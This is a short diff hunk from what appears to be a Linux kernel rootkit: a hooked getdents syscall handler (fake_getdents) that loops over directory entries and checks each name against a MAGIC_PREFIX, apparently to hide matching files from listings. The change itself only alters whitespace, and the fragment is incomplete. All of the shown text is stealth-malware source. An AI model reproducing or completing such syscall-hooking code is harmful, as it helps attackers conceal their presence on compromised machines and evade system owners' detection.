@@ -57,11 +57,11 @@ asmlinkage long fake_getdents(struct pt_regs *regs) {
   i = 0;
   last_d_reclen = 0;
   dirent = (struct linux_dirent *)buffer;
-
+  
   /* run through all the linux_dirent structures */
   while (i < bytes_read) {
     d_reclen = dirent->d_reclen;
-
+    
     /* chech matching with MAGIC_PREFIX */
     j = 0;
     while (j < MAGIC_PREFIX_LEN && dirent->d_name[j] != '\0' && dirent->d_name[j] == MAGIC_PREFIX[j])
